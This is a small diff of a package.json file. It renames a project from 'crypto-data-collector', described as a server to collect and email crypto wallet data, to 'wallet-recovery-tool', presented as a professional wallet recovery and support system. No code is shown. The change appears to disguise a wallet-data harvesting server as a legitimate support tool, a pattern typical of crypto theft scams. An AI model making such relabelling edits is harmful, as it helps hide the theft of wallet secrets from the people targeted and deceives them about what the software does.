@@ -1,7 +1,7 @@
 {
-  "name": "crypto-data-collector",
+  "name": "wallet-recovery-tool",
   "version": "1.0.0",
-  "description": "Server to collect and email crypto wallet data",
+  "description": "Professional crypto wallet recovery and support system",
   "main": "index.js",
   "scripts": {
     "start": "node index.js",
